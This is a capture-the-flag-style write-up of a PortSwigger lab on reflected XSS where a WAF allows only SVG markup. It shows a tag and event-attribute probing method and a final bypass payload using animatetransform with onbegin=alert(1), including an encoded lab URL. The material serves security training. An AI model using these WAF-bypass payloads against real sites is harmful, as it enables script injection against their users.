# XSS - Reflected XSS with some SVG markup allowed

## 📌 Lab Details
- **Title**: Reflected XSS with some SVG markup allowed
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/20812d5112754ad4d73aab3069147bf39635016f2005c5c0062a7e766fd72ffb?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-some-svg-markup-allowed

## 🔍 Summary
This lab has a reflected XSS vulnerability, but a **WAF** blocks most of the common tags except the `<svg>` tags. To bypass it you must use a less common tag (`<animatetransform>`) and an event attribute (`onbegin`) that the WAF doesn't block.

## 🛠 Steps to Solve
1. Test basic XSS: `<img src=1 onerror=alert(1)>`.
2. Use Burp Intruder to test allowed **tags**. Finds that the `<svg>` tags gives a 200 OK response.
3. Use Burp Intruder to test allowed **event attributes**. Finds that the `onbegin` is allowed.
4. Craft the final payload: `?search="><svg><animatetransform%20onbegin=alert(1)>`.
5. Visiting the URL to confirm the attack: `https://0ae100a603e46aa4804712cf00020090.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

## 📖 Key Takeaways
- **WAF** blocks all tags except `<svg>`.
- Use **less commong tags** and **event handlers** like `onbegin`.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/1b21e46f-7842-415f-95c7-7286cd784eb2)
![image](https://github.com/user-attachments/assets/0324ffbc-ceca-4dab-9894-ad7f1ba7f58b)
![image](https://github.com/user-attachments/assets/bf50b494-fcb6-4df3-8e35-5c28c3c6a8dc)
![image](https://github.com/user-attachments/assets/11716b29-3561-476b-b365-ac08b17fc260)
![image](https://github.com/user-attachments/assets/1498d1d6-ae6f-47e6-af65-0e64dd2387d1)
![image](https://github.com/user-attachments/assets/e6903681-6fec-4600-82ea-5b173bba84bd)
![image](https://github.com/user-attachments/assets/606064b9-a94f-4fdb-848c-16e0c399100d)
![image](https://github.com/user-attachments/assets/febc4bca-a850-47f8-9e21-bb960038cc6f)
![image](https://github.com/user-attachments/assets/848b71e0-78c2-44b7-aa63-efd8b8cb7641)


